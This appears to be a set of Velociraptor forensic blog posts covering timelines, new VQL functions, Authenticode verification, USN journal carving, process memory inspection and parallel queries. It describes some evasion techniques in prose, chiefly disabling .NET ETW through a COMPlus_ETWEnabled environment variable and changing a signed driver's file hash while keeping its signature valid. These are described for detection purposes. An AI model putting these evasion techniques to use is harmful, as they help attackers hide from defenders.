Timelines are simply rendered through special markdown syntax. I can
just add a new cell with the timeline in it.

![Adding a timeline cell to the notebook](timeline-5.png)

Choose which timeline to add.

![Selecting the supertimeline name](timeline-6.png)

And we get to see the super timeline (which currently has only one
timeline). It is actually a bit easier to see with full screen so I
recommend to switch to that now.

#### Inspecting timelines

The cell is divided into two: At the top we see the timeline - it has
a bar for each child timeline added as well as the top bar
representing the visible range of the table.

![Inspecting a timeline in the notebook](timeline-7.png)

Below the timeline we see the table of all the events from all
timelines intermixed. The table has two columns, on the left is the
event time, while on the right are all the other fields of the
original table row. You can expand and contract each row to see more
data. Note that the columns we see here are actually the same columns
in the original table that was added to the timeline, so we can always
tweak the original table VQL to only present the columns we care about
and make sure it is not too crowded here.

You can zoom the time in and out by clicking the year or month headers,
but I find it easier to just `Ctrl-Mouse Scroll`.

![Table View time range is visualized on the timeline](timeline-8.png)

You can either step through the table using the regular next/previous
buttons or you can click on any time you like.

![Inspecting the timeline](timeline-9.png)

When you add other timelines to the same Super-timeline you will see
the events in order on the same table rendered with different
colors. You can turn a child timeline on or off by unchecking the name
of the child timeline within the timeline view.

## VQL Changes

In this release there are many improvements to the VQL language
including new plugins, functions and enhanced capability. Let's talk
about some of the interesting changes.

### Starlark is now available in VQL

VQL has always been more of a glue language - connecting the results
of multiple plugins, filtering and some basic manipulation of the
results. Although VQL is getting more powerful all the time, sometimes
it is just easier to do more complicated operations in a more
traditional language, such as Python.

[Starlark](https://github.com/bazelbuild/starlark) is a mini-python
interpreter that can be embedded into Go programs. Velociraptor now
features a starlark interpreter built in! This is useful when you need
to perform more intricate functional style of programming.

Here is a very simple example
```vql
LET StarCode = starl(code='''
def Foo(x):
   return x + 2
''')

SELECT StarCode.Foo(x=2)
FROM scope()
```

The first statement defines a Starlark module by simply calling the
`starl()` function on some python code. The `starl()` function
compiles the code into a module. VQL queries can then access code
within the Starlark module by just calling is as normal. This is most
helpful when we need to do specific manipulation of strings, numbers
etc.

### Functions that manipulate endpoint state

When we first designed Velociraptor we wanted it to be a read only,
forensic system. However, as people use Velociraptor more and more for
`Response` we realized that the R in DFIR requires the tool to
actively change the endpoint! Whether it is to uninstall malware,
correct a vulnerability, or cut off access to a compromised system, we
needed the ability to change settings on the endpoint.

That is why the latest release introduces a number of new VQL
functions, such as `rm`, `reg_set_value`,`reg_rm_value` and `reg_rm_key`
that allow VQL queries to modify the registry or files.

### Server side VQL functions

On the server, Velociraptor now has the `user_delete()` and
`user_create()` to manipulate GUI users. This allows for VQL to
automate initial server provisioning by adding the right users to a
new server.

We also have the ability to enrich IP addresses via the `geoip()` VQL
function. This function allows using a MaxMind database to resolve IP
addresses to location.

## Notable artifacts

### Carving Cobalt Strike configurations from memory

The `Windows.Carving.CobaltStrike` artifact can now carve and decode
the CobaltStrike configuration from memory. This is very helpful to
identify the C&C and other configuration parameters encoded within the
configuration.

![Uncovering Cobalt Strike Config from memory](cs.png)

## Other changes

### Client index rewrite

The client index is used in Velociraptor to quickly search for clients
in the GUI. Previously this was implemented in a way that proved very
inefficient on network volumes like EFS. The index has been upgraded
in 0.6.1 to a more performant structure.

The index will be converted to the new format when the latest 0.6.1
Velociraptor is started for the first time. On EFS volume conversion
might take a while (several hours) due to the underlying slow
filesystem. Once this conversion is complete it need not be done
again.

The new index performs well above 20k clients on EFS (Previously only
SSD was usable at these numbers).

If you liked the new features, take [Velociraptor for a
spin](https://github.com/Velocidex/velociraptor)!  It is a available
on GitHub under an open source license. As always please file issues
on the bug tracker or ask questions on our mailing list
[velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com)
. You can also chat with us directly on discord
[https://www.velocidex.com/discord](https://www.velocidex.com/discord)
.

There is still time to submit it to this year's [2021 Velociraptor
Contributor
Competition](https://docs.velociraptor.app/announcements/2021-artifact-contest/),
where you can win prizes, honor and support the entire DFIR
community. Alternatively, you can share your artifacts with the
community on [Velociraptor's Artifact
Exchange](https://docs.velociraptor.app/exchange/).

---END OF FILE---

======
FILE: /content/blog/2021/2021-06-09-verifying-executables-on-windows-1b3518122d3c/_index.md
======
---
title: Verifying executables on Windows
description: How do we know if a windows executable is a legitimate program written by the purported developer and not malware?  This post covers the basics of Authenticode signatures in windows and how to verify and query them using Velociraptor.
tags:
- Parsing
- Windows
- Security
date: 2021-06-09
---

How do we know if a windows executable is a legitimate program written
by the purported developer and not malware? Users may run malicious
binaries with increasingly devastating consequences, including
compromise or ransomware.

To address this concern, Microsoft has introduced a standard called
Authenticode, designed to sign trusted binaries, so they can be
identified by the operating system. Additionally, recent versions of
Windows will refuse load unsigned device drivers, therefore
maintaining kernel integrity.

While the Authenticode standard itself is well documented, as DFIR
practitioners we need to understand how Authenticode works, and how we
can determine if an executable is trusted during our analysis.

This post explains the basics of Authenticode, and how Velociraptor can be used to extract Authenticode related information from remote systems. Since release 0.6.0, Velociraptor features an Authenticode parser allowing much deeper inspection of signed executables.

### Is a binary signed?

Windows users can easily determine if a binary is signed by simply looking at the Explorer GUI: Right click on the binary and select “Properties” and the “Digital Signatures” tab. This offers a “Details” options where users can view if the signature is ok, who the developer was that signed the executable and other details.

For example, let’s inspect the Velociraptor binary itself which is signed.

![](../../img/1o7geaGdWcYYrycpZq6fwRQ.png)

Obviously we can not use this method to verify thousands of binaries found on remote systems, so we need to understand how Authenticode is implemented under the covers.

Authenticode uses a number of file format standards to actually embed the signature information into the binary file itself, as illustrated in the [diagram below](http://download.microsoft.com/download/9/c/5/9c5b2167-8017-4bae-9fde-d599bac8184a/Authenticode_PE.docx):

![](../../img/0aJlEkIX3M0d8aKnI.png)

The above diagram shows that signing information is embedded in the PE
file itself, and consists of a PKCS#7 structure, itself an `ASN.1`
encoded binary blob. The information contains a hash of the PE file,
and a list of certificates of verifying authorities.

Velociraptor can parse the authenticode information from the PE file
using the parse_pe() VQL function. This allows a VQL query to extract
signing information from any executable binary (Since this is just a
file parser and does not use native APIs, you can use this function on
all supported OSs).

Let’s parse Velociraptor’s own PE file in a Velociraptor notebook
using the following simple query:

```vql
SELECT parse_pe(file=’’’C:\Program Files\velociraptor\velociraptor.exe’’’)
FROM scope()
```

![](../../img/16bcC41eUaZxiHUieQpd9Nw.png)

Among all the usual PE file properties, we can now also spot an Authenticode section, providing information about the subject who signed the binary, the signing time and an expected hash of the file.

### Authenticode hashes

As we can see in the above screenshot, the authenticode standard provides an expected hash within the signature. However this is not the same as a file hash. We can verify this by simply calculating the hash using the VQL hash() function.

![](../../img/1tqLP9HIDA8glYRg0ULZScA.png)

None of the calculated hashes is the same as the “ExpectedHash” provided in the Authenticode signature! This is because Authenticode hashes do not cover the entire PE file, as regular hashes do. Authenticode hashes only cover specific PE sections, in a specific order. They specifically allow PE sections to be reordered, and some regions in the file to be modified.

{{% notice warning %}}
Many people find it surprising that signed PE files can be modified without invalidating the signature.
{{% /notice %}}

This means that hash database detection commonly used in DFIR do not work to identify malicious signed binaries. I have demonstrated this recently in a [video](https://www.youtube.com/watch?v=dmmliSh91uQ) where I modified a vulnerable driver to change its file hash, maintaining it’s authenticode hash. This allowed the driver to be loaded, even through its file hash was completely different and not found on Virus Total.

![](../../img/0unSBclcWJdSgJwhe)

Typically Authenticode hashes are not maintained by malware classifiers such as Virus Total so it is hard to verify if a file has been modified in this way.

### Catalog files

Armed with our new understanding of Authenticode, we may run VQL queries to collect all authenticode information from windows executables. One might be surprised then to discover that many native windows binaries do not contain any authenticode information at all.

![](../../img/156Eq-sGsBkzTnREg7ymsFA.png)

The example above shows that notepad.exe, does not typically contain embedded signing information. Similarly, if one clicks on the the notepad.exe binary in the GUI no digital signature information is shown

![](../../img/1nVs1beihcqM5MefgsK3d9g.png)

Could Microsoft simply have forgotten to sign such an integral part of the OS as notepad.exe?

The answer turns out to be more interesting. When distributing a large
number of binaries, a developer has the option of signing a “catalog
file” instead of each individual binary. The catalog file is
essentially a list of authenticode hashes that are all
trusted. Catalog files are stored in
`C:\Windows\system32\CatRoot\{F750E6C3–38EE-11D1–85E5–00C04FC295EE}`

While .cat files are simply encoded in PKCS#7 format, they do contain a few Microsoft specific objects. Velociraptor can parse the PKCS#7 files directly and supports the extra extensions using the parse_pkcs7() VQL function.

![](../../img/1WZ7Zezy8CRueD28qxklK7g.png)

As can be seen in the above query, the cat file consists of a signer, and a list of hashes. Typically no filenames will be given for the hash (although sometimes there will be a filename hint). It is only the hashes that are important in cat files — this allows files to be renamed, but still verified.

Again these hashes are authenticode hashes as before, so you can not compare them against our usual hash databases like Virus Total. You can calculate the authenticode hash of a PE File using the VQL: *parse_pe(file=FileName).AuthenticodeHash*

To verify that a PE file on disk is signed, one must:

1. Calculate the Authenticode PE hash of the file.

1. Enumerate all cat files on the system

1. Parse each cat file to extract the list of hashes

1. Check if any of these hashes match the one calculated in step 1.

This process is obviously too slow for the OS itself to use. To speed things up, Windows uses a shortcut: A database file exists on the system which simply contains all the trusted hashes directly. The database uses the Microsoft ESE format and is located in C:\Windows\System32\catroot2\*\catdb

![](../../img/1LRhZH248S7dbHAW9vPOgbw.png)

The file is typically locked so you would need to use Velociraptor to collect it (Velociraptor will automatically parse the file out of the NTFS volume). The database contains tables mapping the hash to a cat file name and may contain hashes of old cat files that have been uninstalled from the system.

### Verifying Signed files

So far we have learned how authenticode stores hashes in the PE file and we can verify if the hash of the current file matches the hash within the signature information, but how can we trust that this hash is correct?

To really verify a signature, Windows must verify the trust chain by following the certificates to a trusted root certificate. Windows maintains a list of trusted certificates in a “Certificate Root Store” within the registry. There are several stores, a main one for the OS and each user also has a certificate store in their NTUSER.dat hive.

Velociraptor can inspect the certificate root store using the certificates() plugin. This plugin uses the Windows APIs to query the root store and report the trusted certificates. It is typically important to verify the trusted certificate root store since if a adversary adds a new certificate to the root store, their executables will be trusted by the OS.

For example, I added the Velociraptor CA (a self-signed CA cert) to the windows root store below. I can see now that Windows trusts this certificate

![](../../img/1wfJvLYsB8lD2iCMkHmMk2g.png)

Where are the trusted certificates stored on the system? A quick registry search will show a set of keys and values for the trusted certificates within the windows registry

![](../../img/1ixxSaOLeJm2KtbEzMQu06A.png)

The values are undocumented binary data. Luckily, Didier Stevens has previously written about the format of these registry keys [here](https://blog.nviso.eu/2019/08/28/extracting-certificates-from-the-windows-registry/) explaining these are simple length encoded items.

We can use Velociraptor’s built in binary parser to automatically parse these keys. The details are in the [Windows.System.RootCAStore artifact](https://github.com/Velocidex/velociraptor/blob/master/artifacts/definitions/Windows/System/RootCAStore.yaml) but collecting it from the endpoint is easy

![](../../img/1woqK6rwmqIgZRoFqH6rj_w.png)

An added bonus of parsing the certificate directly from the registry keys is that now we have a registry key modification time to indicate when the certificate was installed into the root store. A quick VQL search to narrow down recently installed certificates can quickly zero in on malicious alterations and provide a timeline of compromise. Adding new certificates to a root store is not commonly done and even then they are likely to be done by a software update (so they should apply to most systems in the fleet). A hunt collecting this artifact and stacking by frequency can reveal compromises in minutes.

![](../../img/1AtlKRrylrUZn6voUArJb6A.png)

### Putting it all together

In this blog post we looked at how authenticode signing works on Windows. We found that authenticode signatures can be embedded within the PE file, but that is not the whole story. Sometimes signatures are applied to a catalog file which contains the hash of the PE file instead.

Ultimately we simply need to know if a particular binary file is trusted or not. Velociraptor’s authenticode() function was upgraded in the 0.6.0 release to support both methods of trust automatically. Simply apply it to the PE file and it will include the method of trust as well.

![](../../img/1VjBA5LZYvkpJaIBc-AtEAA.png)

The above screenshot shows both our examples — The velociraptor binary was signed via embedded signature on the right and Notepad.exe was signed via catalog. In both cases Velociraptor is showing the signer and their issuers and if the file is trusted. We additionally get the catalog file that is used to verify the file if applicable.

If you would like to quickly verify your windows executables at scale, take[ Velociraptor for a spin](https://github.com/Velocidex/velociraptor)! It is available on GitHub under an open source license. As always please file issues on the bug tracker or ask questions on our mailing list [velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com) . You can also chat with us directly on discord [https://www.velocidex.com/discord](https://www.velocidex.com/discord)

---END OF FILE---

======
FILE: /content/blog/2021/2021-06-16-carving-usn-journal-entries-72d5c66971da/_index.md
======
---
title: Carving $USN journal entries
description: The USN journal is a unique source of evidence because it can provide a timeline for when files were deleted, even if the file itself is no longer found on the system. While the USN journal is very useful, it is short lived. This post explains how to write a carver to recover deleted USN journal entries.
tags:
- Carving
- USN
- Forensics
- Windows
date: 2021-06-16
---

## Digging even deeper!

![](../../img/01gTI29RZ6a6Lxaye.jpg)

One of the most important tasks in DFIR is reconstructing past filesystem activity. This is useful for example, in determining when files were introduced into the system (e.g. in a phishing campaign or drive by downloads) or when binaries were executed by way of modifications of prefetch files.

I have previously written about the [Windows Update Sequence Number journal (USN)](https://velociraptor.velocidex.com/the-windows-usn-journal-f0c55c9010e). The USN journal is a file internal to the NTFS filesystem that maintains a log of interactions with the filesystem.

The USN journal is a unique source of evidence because it can provide a timeline for when files were deleted, even if the file itself is no longer found on the system. In the screenshot below I parse the USN journal using Velociraptor’s built in USN parser. I filter for all interactions with the **test.txt** file and find that it has been removed (The **FILE_DELETE** reason).

![](../../img/1tcte8Ol0lLCO7KtpJ1Kbuw.png)

While the USN journal is very useful, it is short lived. The system keeps around 30mb worth of USN log, and older entries are removed by making the start of the file sparse. On a busy system this might result in less than a day’s worth of logs!

### Carving the USN journal

Carving is a very popular forensic technique that aims to uncover old items that might still be present in unstructured or unallocated data on the drive. One would resort to carving in order to uncover new leads.

Carving attempts to recover structured information from unstructured data by identifying data that follows a pattern typical for the information of interest.

In the case of the USN journal, we can examine the raw disk and extract data that looks like a USN journal record, without regard to parsing the record from the NTFS filesystem or using any structure on the disk.

{{% notice warning %}}

Disclaimer: Depending on the underlying hardware carving may or may
not be effective. For example, when running on an SSD, the hardware
will aggressively reclaim unallocated space, making it less
effective. We typically use carving techniques as a last resort or to
try to gather new clues so its worth a shot anyway.

{{% /notice %}}

### The structure of a USN journal record

In order to carve the USN record from the disk, we need to understand what a USN record looks like. Our goal is to come up with a set of rules that identify a legitimate USN journal record with high probability.

Luckily the USN journal struct is well documented by Microsoft

![](../../img/1byPQQuD1tjF5pwHXhexdtg.png)

In the above we can see that a USN record contains a number of fields,
and we can determine their offsets relative to the record. Let’s look
at what a typical USN record looks like. I will use Velociraptor to
fetch the USN journal from the endpoint and select the hex viewer to
see some of the data.

![](../../img/1onswBmgD7ZPdxnVV8RxDuA.png)

In the screen shot above I can identify a number of fields which seem
pretty reliable — I can develop a set of rules to determine if this is
a legitimate structure or just random noise.

1. The RecordLength field starts at offset 0 and occupies 4 bytes. A
   real USN journal must have a length between 60 bytes (the minimum
   size of the struct) and 512 bytes (most file names are not that
   large).

2. The MajorVersion and MinorVersion is always going to be the same —
   for Windows 10 this is currently 2 and 0. These 4 bytes have to be
   02 00 00 00

3. The next interesting field is the timestamp. This is a Windows
   FileTime format timestamp (so 64 bits). Timestamps make for a good
   rule because they typically need to be valid over a narrow range to
   make sense.

4. The filename is also stored in the record with the length and the
   offset both specified. For a reasonable file the length should be
   less than say 255 bytes. Since the filename itself follows the end
   of the struct, the filename offset should be exactly 60 bytes (0x36
   — the size of the struct).

Let’s take a look at the timestamp above. I will use [CyberChef ](https://gchq.github.io/CyberChef/#recipe=Windows_Filetime_to_UNIX_Timestamp%28'Seconds%20%28s%29','Hex%20%28little%20endian%29'%29From_UNIX_Timestamp%28'Seconds%20%28s%29'%29&input=MDRlY2VkZWE1ODYyZDcwMQ) to convert the hex to a readable timestamp.

![](../../img/1iCD7doMdvFls77vZdOdjKw.png)

What is the lowest time that is reasonable? The last byte (most
significant byte) should probably be 01, the next byte in should be
larger than `0xd0`. I can quickly check the earliest time that ends with
`0xd0` `0x01` using `CyberChef` — it is after 2015 so this is probably good
enough for any investigations run in 2021. Similar logic shows we are
good until 2028 with the pattern “d? 01”

![](../../img/1o16pA_mO0r5KNGsL4aMdug.png)

### Developing the VQL query for the carver

A good carver is fast and accurate. Since we need to scan a huge amount of data in a reasonable time (most hard disks are larger than 100Gb), we need to quickly eliminate obviously invalid data.

The usual approach is to use a fast but rough matcher for a first level sieve — this will eliminate most of the obviously wrong data but might have a high false positive rate (i.e. might match invalid data that is not really a USN record at all).

We can then apply a more thorough check on the match using a more accurate parser to eliminate these false positives. If the false positive rate remains reasonably low, we wont waste too many CPU cycles eliminating them and will maintain a high carving velocity while still having high accuracy.

When I need a binary pattern matching engine, I immediately think of Yara — the Swiss army knife of binary searching! Let’s come up with a good Yara rule to identify USN journal entries. You can read more about Yara rule syntax [here](https://yara.readthedocs.io/en/stable/), but I will use a binary match rule to detect the byte pattern I am after.

As usual in Velociraptor, I will create a notebook and type a query into the cell. As a first step I will stop after one hit (LIMIT 1) and view some context around the hit. Accessing the raw disk using its device notation (**\\\\.\\C:**) and the NTFS driver provides access to the raw logical disk from Velociraptor versions after 0.6.0.

![](../../img/1KgW2M_VDzWABx2xP_9iMVA.png)

The rule will match a **RecordLength** smaller than 512 bytes,
**Version** must match 2. The timestamp field must end in D? 01
(i.e. `0xD0–0xDF` followed by `0x01`). Finally the filename length
must be smaller than 256 and the file offset must be exactly 60
(0x36).

As you can see above I immediately identify a hit and it looks pretty similar to one of the USN entries I extracted before.

### Parsing the USN record

The Yara signature will retrieve reasonable candidates for our carver. Now we need to parse the record properly. In order to do that I will use Velociraptor’s binary parser. First I will write a profile to describe the USN struct and apply the parser to extract the MFT entry ID from the record. I can then use Velociraptor’s built in NTFS parser to resolve the MFT entry ID to a full path on disk.

You can see the full details of the artifact [here](https://github.com/Velocidex/velociraptor/blob/master/artifacts/definitions/Windows/Carving/USN.yaml) but collecting this artifact from the endpoint is easy — simply create a new collection and select the Windows.Carving.USN artifact.

![](../../img/1hw6F2M-_1EHgaRAjY2-S7A.png)

Since carving usually takes a long time, it is likely to exceed the default 10 minute collection timeout. For this artifact it is recommended to increase the timeout in the “Specify Resources” wizard pane (On my system, this artifact scans about 1Gb per minute so an hour will be enough for a 60Gb disk).

![](../../img/1Wwe8cBWg01X4l9H3-AMwKQ.png)

After a while the carver will produce a lot of interesting hits — some of which might be from a long time before what can normally be found in the USN journal (several months even!). If we are lucky we might see something from the timeframe of our incident.

We can post process the results to try to put a timeline on a compromise. For example, I will write a post processing query to find all prefetch files that were deleted (Deleting prefetch files is a common [anti-forensic technique](https://attack.mitre.org/techniques/T1070/004/)).

![](../../img/17oy3DzemUP4M60dfYQYNAw.png)

I can see two occasions where prefetch files were removed. I can see the timestamp based on the USN record, as well as the offset into the disk where the hit is found (around 3Gb into the drive).

Note that in the case of deleted files, the filename stored in the USN record may be completely different than the FullPath shown by the artifact. The FullPath is derived by parsing the NTFS filesystem using the MFT entry id referenced by the USN record.

For deleted files, the MFT entry may be quickly reused for an unrelated file. The only evidence left on the disk of our deleted prefetch file is in the USN journal, or indeed in USN record fragments we recovered once the journal rolls over.

### Conclusions

Carving is a useful technique to recover new investigative links or clues. Because carving does not rely on filesystem parsing it might recover older deleted records from a long time ago, or from previously formatted filesystem.

The flip side is that carving is not very reliable. It is hard to predict if any useful data will be found. Additionally, if the adversary wants to really confuse us they might plant data that happens to look like a USN record — without context we really can not be sure if this data represents a real find or an anti-forensic decoy. A common issue is finding hits in what ends up being Virtual Machine disk images that just happen to have been stored on the system at one time — so the hits do not even relate to the system we are investigating.

Take all findings with a grain of salt and corroborate findings with other techniques.

This article demonstrated the general methodology of writing an effective carver — use a fast scanner to extract hits quickly, despite a potentially higher false positive rate (using an engine such as Yara). Then use more thorough parsing techniques to eliminate the false positives and display the results (such as Velociraptor’s built in binary parser). Finally apply VQL conditions to surgically target findings to only relevant records to our investigation.

To play with this new feature yourself, take Velociraptor for a spin! It is available on [GitHub](https://github.com/Velocidex/velociraptor) under an open source license. As always please file issues on the bug tracker or ask questions on our mailing list [velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com) . You can also chat with us directly on discord [https://www.velocidex.com/discord](https://www.velocidex.com/discord)

---END OF FILE---

======
FILE: /content/blog/2021/2021-04-16-digging-into-process-memory-33c60a640cdb/_index.md
======
---
title: Digging into process memory
description: Unlike traditional dead disk forensic tools, Velociraptor’s main advantage is that it is capable of directly looking at volatile system state, such as running processes, open files and currently connected sockets. This class of forensic artifacts are called Volatile Artifacts since they change rapidly as the system operates. Learn how Velociraptor collects volatile system state.
tags:
- Forensics
- Memory
- Windows
date: 2021-04-16
---

Unlike traditional dead disk forensic tools, Velociraptor’s main advantage is that it is capable of directly looking at volatile system state, such as running processes, open files and currently connected sockets. This class of forensic artifacts are called Volatile Artifacts since they change rapidly as the system operates — processes can start and stop quickly, files can be closed etc.

Traditionally, acquiring volatile artifacts meant taking a raw physical memory image, and then analyzing this with a memory analysis framework such as [Volatility](https://github.com/volatilityfoundation/volatility) or [Rekall](https://github.com/google/rekall). These frameworks reassemble the contents of physical memory into higher level abstractions, like processes, threads, registry content etc.

While at first it might appear that a physical memory image contains a perfect snapshot of the running state of a system, this is not typically the case. The physical memory image only contains those pages currently locked into physical memory — however, modern operating systems use virtual memory to represent process and kernel memory address spaces. Each virtual memory address may refer to either paged out memory (i.e. only present in the page file) or memory mapped files (i.e. only present on the file system in e.g. dll or executable files), neither of which are typically included in a physical memory image.

Additionally, most physical memory images obtained in a DFIR setting, contains acquisition smear (i.e. the memory is changing during the acquisition process). This smear leads to inconsistencies, making memory analysis from physical memory samples generally a hit or miss affair.

For DFIR purposes it is preferable to extract data directly from the running system, rather than rely on fragile memory analysis. For example, to obtain a list of processes, it is always more reliable to use the system APIs than to take a full memory image, ship it off the endpoint, and then use a framework like Volatility to extract the same data from the raw image.

Many of the same techniques implemented in Volatility for physical memory analysis can also be implemented directly on the endpoint using OS APIs. Velociraptor already contains plugins such as “vad”, “pslist”, “modules”, “handles”, “objtree” etc.

Consider the identification of malicious processes running in memory. Many modern tools use memory only injection, where malicious code is added to processes but is never written to disk. Detecting this type of malware requires inspection of process memory using for example a Yara signature.

For example, [Malpedia](https://malpedia.caad.fkie.fraunhofer.de/) contains Yara signatures for common malware families derived from automated identification of common code blocks. We can apply these signatures to detect memory injected [Cobalt Strike beacon](https://malpedia.caad.fkie.fraunhofer.de/details/win.cobalt_strike) by simply scanning each process address space and reporting any hits.

Velociraptor included bindings to libyara’s process scanning capabilities for a while now, exposed through the VQL plugin proc_yara() and usable through artifacts such as [Windows.Detection.ProcessMemory.CobaltStrike](https://github.com/Velocidex/velociraptor/blob/master/artifacts/definitions/Windows/Detection/ProcessMemory/CobaltStrike.yaml).

### Direct access to process memory

Since release 0.5.8, Velociraptor provides direct access to process memory via the “process” [accessor](https://www.velocidex.com/docs/user-interface/investigating_clients/virtual_filesystem/#filesystem-accessors). This allows any plugins and functions that normally operate on files to also operate on process memory, as if the process memory was just another file.

To demonstrate this new accessor, I will write “this is a test” in notepad without saving the file on disk (so the string exists only in memory). I will then write some VQL to detect this string in the process memory of notepad

![](../../img/1jhU1ZpOf3ArKtHQsES5UpA.png)

In the above example, I am iterating over all processes with a name matching “notepad” and then applying a yara signature over their process address space. The “process” accessor allows me to open the process represented by the filename “/<pid>” as if it was a file. The `yara()` plugin (which normally operates on files) will just see process memory as another file to scan.

I can then also extract some context around the hits to see if the hit is a false positive.

### Determining process environment variables

When a process is launched it receives environment variables that often affect the way the launched program behaves. I was curious to see if it is possible to determine the environment variables that a process is launched with?

On windows, each process is started with a [Process Environment Block](https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb). This data structure is populated by the OS before the process is created and contains important information about the process. Processes can extract this information at runtime. The process environment variables are stored in the PEB too and therefore we can parse these out from each process’s memory.

Velociraptor has a powerful binary parser built in, as was described previously in the post “[Parsing binary files](https://velociraptor.velocidex.com/parsing-binary-files-d31114a41f14)”. Having the process memory exposed via an accessor allows us to apply this parser to process memory via a VQL query.

If you are interested in the details, check out the VQL for the `Windows.Forensics.ProcessInfo` artifact [here](https://github.com/Velocidex/velociraptor/blob/master/artifacts/definitions/Windows/Forensics/ProcessInfo.yaml), but here is the result of collecting the process information (including each process’s environment variables) from my system

![](../../img/1uuWWzOGWgSnIg_4Or8JLrQ.png)

### Detecting ETW subversion.

Recently I read Adam Chester’s [blog post](https://blog.xpnsec.com/hiding-your-dotnet-complus-etwenabled/) where he described his finding that the .NET ETW provider can simply be disabled by setting the `COMPlus_ETWEnabled` environment variable to 0. This is dramatically demonstrated by using process hacker to inspect the .NET assemblies of a powershell process.

![](../../img/1GCGVJTqyGR9Hc66F6cFiJg.png)

When the `COMPlus_ETWEnabled` environment variable is set to “0”, process hacker will be unable to inspect the loaded assemblies, since it relies on ETW support to do so and this is disabled within the running powershell process.

While this anti-detection technique is very simple for attackers to implement — they simply set an environment variable before launching the target binary, it should be very easy for us to detect it, using the following heuristics:

* Iterate over all processes, and
* if any process has an environment variable starting with “COMPlus_” then it is suspicious.

Our VQL can take advantage of the existing `Windows.Forensics.ProcessInfo` artifact and simply inspect each process’s environment dictionary

![](../../img/1QgWxuYVpwR0yVpqq8LnPkA.png)

In the above query we extract each process and its environment dictionary from the `Windows.Forensics.ProcessInfo` artifact, then iterate over each key and value using the *items()* plugin, filtering any keys beginning with “COMPlus”.

To convert this VQL into a detection, we now encapsulate the query in an artifact and hunt all our endpoints for processes that have the environment variable set. In practice, there should not be any legitimate reason to switch off the .NET ETW provider, so if we see this variable set in the environment, it is a very strong signal and requires further investigation.

### Conclusions

This post introduced the “process” accessor, which exposes process memory to all VQL plugins that can usually access files. The process accessor allows us to implement memory analysis techniques on running processes in real time, safely, quickly and reliably, without needing to resort to acquiring and analysing full physical memory images. This provides unprecedented visibility into the state of the endpoint and forms the basis for novel detection and hunting possibilities.

To use this feature yourself, take[ Velociraptor for a spin](https://github.com/Velocidex/velociraptor)! It is a available on GitHub under an open source license. As always please file issues on the bug tracker or ask questions on our mailing list [velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com) . You can also chat with us directly on discord [https://www.velocidex.com/discord](https://www.velocidex.com/discord)

---END OF FILE---

======
FILE: /content/blog/2021/2021-01-22-concurrent-vql-6d381fdb0b1f/_index.md
======
---
title: Concurrent VQL
description: Digging even faster…
tags:
- Performance
- VQL
date: 2021-01-22
---

![](../../img/0O-0AL55-9dX4uKDn?width=600px)

Velociraptor’s special source is really the Velociraptor Query Language (VQL). Using VQL allows administrators to query their endpoints and respond to new threats quickly and flexibly.

VQL was always intended to be a simple query language which users could pick up in a matter of hours, while being powerful at the same time. We never intended VQL to be a full blown programming language. Nevertheless, performance is a critical feature of VQL, simply because queries typically need to process large amount of data quickly. The challenge is how to expose powerful multithreaded programming concepts to VQL’s simple model of operation.

In this blog post we explore one of the new performance features that allow users to harness the full processing power of their platform.

### Simple example: hash every file

Let’s consider a simple use case — hash every file on the system. I wrote a simple query to simply glob recursively through the filesystem, and for each file found calculate its hash.

To test this query I ran it in a notebook within the Velociraptor GUI.

![](../../img/1lKdoOeFNUK3S0Jfoc5hjAg.png)

This query is simple to understand, and fits the mental model of VQL: The glob() plugin searches the filesystem for files matching the glob expression (wildcards) and emits a single row per matched file. The query then processes each of these rows and passes the path to the hash() function which returns the hash.

When I ran the above query on my system, I kept an eye on my CPU activity monitor applet and I could see a single core spiking, but most of my other cores were idle (This is a 24 core machine).

![](../../img/1AqHCS0ooUVU6uu_d1MbwQA.png)

After a while, the query completes and I get the results (There were 4700 files hashed) and it took 46 second overall.

![](../../img/1_x-w8bzPKcgDxIpemcuAvg.png)

While this is satisfactory, I was a bit worried about my idle cores . This simple query was unable to fully utilize the processing capacity of my machine because the query was essentially sequential — each row was hashed in turn, before hashing the next row.

In this case, 46 seconds is not too bad, but if I wanted to hash the entire hard disk (as opposed to the **/usr/bin** directory) it could take a very long time.

### Run the hash in parallel

My query receives its file names from the glob() plugin which is very fast — clearly the performance blockage in my query is the **hash** function which is CPU intensive. I would therefore love to have a hash operation sent to each core in parallel, then all my cores will be recruited and the query will run faster.

Since Velociraptor 0.5.5, the foreach() plugin has an additional “workers” parameter. Readers who use Velociraptor extensively are familiar with the foreach() plugin, as it is probably the most common plugin in use. We also covered it in detail in an earlier blog post, [here](https://medium.com/velociraptor-ir/the-velociraptor-query-language-pt-2-fe92bb7aa150).

In a nutshell, the foreach() plugin takes 2 parameters. The “row” parameter is another query which will be run, taking each row produced by it. The “query” parameter is another query which will be evaluated with a nested scope containing the row obtained (Conceptually, the foreach plugin acts in a similar way to the SQL JOIN operator).

For example the above query can be refactored to

![](../../img/1yQZMsoGUDzFNoHNBDvqXSg.png)

The “row” query simply calls the glob() plugin and extracts the FullPath of each file matching the wildcards. The foreach() plugin will take that row and evaluate the query on the scope (therefore evaluating the hash() function).

This still does not buy us very much because each row is still processed in sequence one after the other.

In 0.5.5 the foreach() plugin has the “workers” parameter: This allows the plugin to create workers in a pool, and send them each row in parallel. While the “row” query is still evaluated sequentially, the “query” query will now be evaluated on a worker pool in a separate thread.

![](../../img/1g18d_ZqooGZyGFtBVgTpFg.png)

This time when I run the query, my CPU load applet lights up — all cores are busy!

![](../../img/1WW4I3UqyHiQ5oisTojx5mw.png)

The same query now takes 6 seconds instead of 46 seconds! A factor of 8 times faster.

![](../../img/1UON1jBo_919hBi9LMn-QJw.png)

This query was particularly suitable for parallelization because the CPU intensive operation was done on each row (hashing) but generating the rows themselves is very quick (globbing).

### Other use cases

In 0.5.5, Velociraptor’s offline collector now uses the above technique to upload multiple files simultaneously into the collection Zip file. Coupled with a multithreaded Zip writer implementation this allows parallel compression of many files at once — speeding up acquisition on most machines. The below screenshot shows the collector making good use of CPU resources during acquisition with a significant speed up.

![](../../img/1t5DedninX180zBSrNIv1dA.png)

### Thoughts about design

Many users when they first are introduced to VQL ask me about the “query optimizer/planner”. I guess this is because VQL is very similar to SQL in syntax. However, VQL does not have any query rewriting behind the scenes — with VQL what you write is what you get!

